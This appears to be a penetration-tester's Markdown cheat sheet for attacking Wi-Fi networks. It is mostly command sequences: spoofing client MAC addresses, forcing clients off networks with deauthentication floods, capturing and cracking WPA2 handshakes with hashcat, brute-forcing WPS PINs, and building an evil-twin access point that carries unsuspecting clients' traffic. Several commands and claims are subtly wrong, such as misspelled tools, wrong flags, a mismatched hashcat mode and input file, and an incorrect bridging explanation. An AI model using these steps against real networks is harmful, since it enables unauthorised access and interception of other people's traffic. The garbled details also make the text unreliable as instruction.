# WiFi

## Monitor mode
Either:   
```
airmon-ng start wlan0
```

Or:  
```
ifconfig wlan0 down
iwconf wlan0 mode monitor
ifconfig wlan0 up
```


## Capture frames
`airodump-ng wlan0mon`

## Capture MAC addresses
To capture the MAC address of clients who have authenticated to the AP:  

`airodump-ng -c <channel> -a -bssid <bssid>`

Where:   
`<channel>` - The Channel that the AP is broadcasting on   
`<bssid>`   - The BSSID of the AP

## Spoof MAC address
Once a MAC address has been determined, the local MAC can be changed. First you need to take down the local adapter:

`ifconfig wlan0 down`

Then you can use `macchanger` to change the MAC address to match the one you captured:

`macchanger -m <mac> wlan0`

Finally, bring the interface back up:

`ifconfig wlan0 up`

## Attacking WPA2-PSK
WPA2-PSK is the most widely used protocol used for securing Wi-Fi, although WPA3 is starting to gain popularity.

To crack WPA2-PSK, the hash of the password must be captured and then cracked offline using a tool like `hashcat`. This password hash can be captured by sniffing the network traffic until the client sends it to the AP, this can either be done stealthily by waiting or by forcing the client to disconnect from the AP.

The first step is to put the wireless adapter into [monitor mode](#monitor-mode) and then running:

`airodump-ng -bssid <BSSID> -c <channel> --write <file> wlan0mon`

where:   
`<BSSID>`    - The BSSID of the Target AP   
`<channel`   - The Channel the AP is transmitting on   
`<file>`     - A filename used to store the captured handshake   

### Forcing a client to reconnect
If you don't want to wait for a client to connect to capture the password hash, you can force an already connected client to disconnect from the AP. This will cause the client to reconnect, and you can quickly capture the hash:

`aireplay-ng -deauth 100 -a <BSSID> wlan0mon`

where:   
`-deauth 100` - Send 100 deauth frames to the AP   
`<BSSID>`     - The BSSID of the target AP

When the client reconnects, the four way handshake will be captured.

```
CH 11 ][ Elapsed:  3 hours 15 minutes  ][ 2023-02-05 10:27 ] [  WPA Handshake:  12:09:27:00:18:21
```

### Brute force
Now that you have the handshake, you can use a cracking program like `hashcat` to brute-force the password. This can either be done using a dictionary, or by iterating through a series of values.

`hashcat -m 16800 file.cap /user/share/dictionary/passwords.txt`

## Using stealth to capture the 4-way handshake
Forcing clients to disconnect from the AP is intrusive, fortunately there is a better method which can be used.

First, we need to disable the Network Manager

`sudo systemctl stop NetworkManager.service`
`sudo systemctl stop wpa_supplicant.service`

### Capture packets
Then use `hcxdumptool` to capture packets

`sudo hcxdumptool -i <interface> -o dumpfile.pcapng --active_beacon --enable_status=15`

Leave this running for a few minutes to capture enough data.

Where:   
`<interface>`      - The wireless interface to capture packets
`dumpfile.pcapng`  - The file that will contain captured data

### Capture BSSIDs
Next, capture a list of BSSIDs using `hcxdumptool`

`sudo hcxdumptool --do_rcascan -i <interface>`

Where:   
`<interface>`      - The wireless interface to capture packets

This will write out to the console a list of BSSIDs and ESSIDs like:

|BSSID       |FREQ  |CH | RSSI |BEACON |RESPONSE |ESSID   |
|------------|------|---|------|-------|---------|--------|
|3a8954495f80|2466  |11 |-46   |480    | 349     | Oskar  |
|a0321a6e2a43|5034  | 6 |-48   |665    | 239     | Xion   |
|5856ce52c5f6|2466  |11 |-38   |601    | 140     | HT105T |
|92355c0bca3c|5284  |56 |-72   | 37    | 103     | Car    |
|807543a448a2|5009  | 1 |-38   | 58    |  67     | Skynet |
 

Next enable the Network Manager again

`sudo systemctl start NetworkManager.service`
`sudo systemctl start wpa_supplicant.service`

### Convert packet to use with hashcat
The output from hcxdumptool created a file called `dumpfile.pcapng`. This file needs to be converted into a format that hashcat can use to crack the WPA/WPA2 data.

`hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng`

Where:   
`hash.hc22000`    - The output file for hashcat
`dumpfile.pcapng` - The input file, created by hcxdumptool

The resulting file `hash.hc2200` may contain multiple entries. Remove all entries, except the ones containing the BSSID you are interested in cracking.

### Using hashcat to crack WPA/WPA-2

`hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d` 

Where:   
`hash.hc2200` - The file containing WPA/WPA-2 data

`hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d` 


## Attacking WPS
WPS is a mechanism where a client can connect to an AP using a PIN, rather than a complex password. The PIN is made up of 8 digits, with the last digit being a checksum. With WPS 1.0, the first four are checked, and then the last 3 are checked separately. This gives 11,000 possible PINs. However with WPS 2.0, this has since been mitigated.

To get a list of APs with WPS, use `wash`:

`wash -i wlan0mon`

This will show a list like this:

|BSSID              |Ch |dBm  |WPS  |Lck  |Vendor    |ESSID                        |
|-------------------|---|-----|-----|-----|----------|-----------------------------|
|FF:FF:FF:FF:FF:FF  | 1 | -58 | 2.0 | No  | Unknown  | Business-Net                |
|FF:FF:FF:FF:FF:FF  | 1 | -54 | 2.0 | No  | Broadcom | Home                        |
|FF:FF:FF:FF:FF:FF  | 1 | -24 | 2.0 | No  | Broadcom | Home                        |
|FF:FF:FF:FF:FF:FF  | 1 | -48 | 2.0 | No  | Broadcom | Home                        |
|FF:FF:FF:FF:FF:FF  | 1 | -50 | 2.0 | Yes | Broadcom | OfficeJet 6950              |
|FF:FF:FF:FF:FF:FF  | 1 | -50 | 2.0 | No  | Unknown  | Apathy                      |
|FF:FF:FF:FF:FF:FF  | 1 | -50 | 1.0 | No  | Unknown  | Car                         |


Using the information from `wash` and `airodump-ng`, the PIN can be brute forced using either `bully` or `reaver`

### Bully

`bully wlan0mon -b <BSSID> -e <ESSID> -c <Channel>`

where:   
`<BSSID>`    - The BSSID of the AP
`<ESSID>`    - The ESSID of the client
`<Channel>`  - The channel that the AP is transmitting on

### Reaver

`reaver -i wlan0mon -b <BSSID> -vv`

where:   
`<BSSID>`    - The BSSID of the AP

## Evil Twin (MiTM)
`airbase-ng` turns a Wi-Fi adapter into an AP, broadcasting and accepting client connection. To make this possible, two network interfaces are required.

### Creating an AP
`airbase-ng -a <BSSID> --essid <ESSID> -c <Channel> wlan0mon`

where:   
`<BSSID>`    - The BSSID of the AP
`<ESSID>`    - The ESSID of the client
`<Channel>`  - The channel that the AP is transmitting on

### Bridge the connection
To allow internet traffic to flow through the rouge AP, a second network interface needs to be configured to allow traffic to seamlessly flow to any unsuspectingly connected clients.

While `airbase-ng` is running, open another terminal and check for an `at0` interface.

`iwconfig`

```
root@kali
└─# iwconfig                   
lo        no wireless extensions.

wlan0mon  unassociated  ESSID:""  Nickname:"<WIFI@REALTEK>"
          Mode:Monitor  Frequency=2.437 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

at0       no wireless extensions.
```

`at0` has been created, but it needs wireless extensions. This can be done by entering:

```
ip link add name ha type bridge

ip link set ha up

ip link set <Interface> master ha

ip link set at0 master ha
```

where:   
`<Interface>` is the interface connected to the internet (eth0 for example)

Finally, the newly created interface `ha` needs to have an IP address assigned to it. This can be done using `dhclient`

`dh client ha &`

### Forcing clients to connect to the fake AP
To force clients to connect to the Evil Twin AP, they need to be kicked off the legitimate AP. This can be done using `aireplay-ng` and sending de-authentication frames.

`aireplay-ng -deauth 1000 -a <BSSID> wlan0mon wlan0mon -ignore-negative-one`
